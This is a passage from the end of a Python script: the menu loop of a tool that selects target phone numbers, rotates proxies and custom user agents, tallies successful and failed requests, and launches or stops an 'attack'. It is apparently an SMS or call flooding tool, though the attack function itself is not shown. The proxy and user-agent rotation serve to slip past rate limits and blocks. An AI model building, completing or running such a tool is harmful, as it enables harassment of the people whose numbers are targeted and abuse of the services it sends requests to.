                        for part in sel.split(","):
                            part = part.strip()
                            if "-" in part:
                                s, e = part.split("-")
                                selected.extend(range(int(s)-1, int(e)))
                            else: selected.append(int(part)-1)
                        numbers = [numbers[i] for i in selected if 0 <= i < len(numbers)]
                    except: print(f"{F.RED}Invalid{F.RESET}")
                print(f"{F.GREEN}{len(numbers)} selected{F.RESET}")
        elif ch == "12":
            print(f"{F.CYAN}1=Random  2=Sequential  3=No proxy{F.RESET}")
            m = input(f"{F.GREEN}Choose: {F.RESET}").strip()
            if m == "1": cfg["rotate_proxy"] = True; cfg["rotate_mode"] = "random"
            elif m == "2": cfg["rotate_proxy"] = True; cfg["rotate_mode"] = "sequential"
            elif m == "3": cfg["rotate_proxy"] = False
            save_config(cfg)
        elif ch == "13":
            print(f"\n{F.CYAN}Stats:{F.RESET} Total: {cfg['request_count']}  {F.GREEN}OK: {cfg['success_count']}{F.RESET}  {F.RED}FAIL: {cfg['fail_count']}{F.RESET}")
            if cfg['request_count'] > 0: print(f"{F.YELLOW}Rate: {cfg['success_count']/cfg['request_count']*100:.1f}%{F.RESET}")
        elif ch == "14":
            sc = input(f"{F.GREEN}1=Save  2=Load: {F.RESET}").strip()
            if sc == "1": save_config(cfg); print(f"{F.GREEN}Saved{F.RESET}")
            elif sc == "2": cfg = load_config(); print(f"{F.GREEN}Loaded{F.RESET}")
        elif ch == "s":
            start_attack(cfg, numbers, proxies_list, custom_uas)
        elif ch == "x":
            cfg["running"] = False
            print(f"\n{F.RED}Attack stopped!{F.RESET}")
            time.sleep(1)
        elif ch == "0":
            cfg["running"] = False
            print(f"\n{F.YELLOW}Exiting...{F.RESET}")
            time.sleep(0.5)
            sys.exit(0)
        else:
            print(f"{F.RED}Invalid option{F.RESET}")
        
        if ch not in ("s", "x"):
            input(f"\n{F.YELLOW}Press Enter...{F.RESET}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{F.RED}Exiting...{F.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{F.RED}Error: {e}{F.RESET}")
        sys.exit(1)
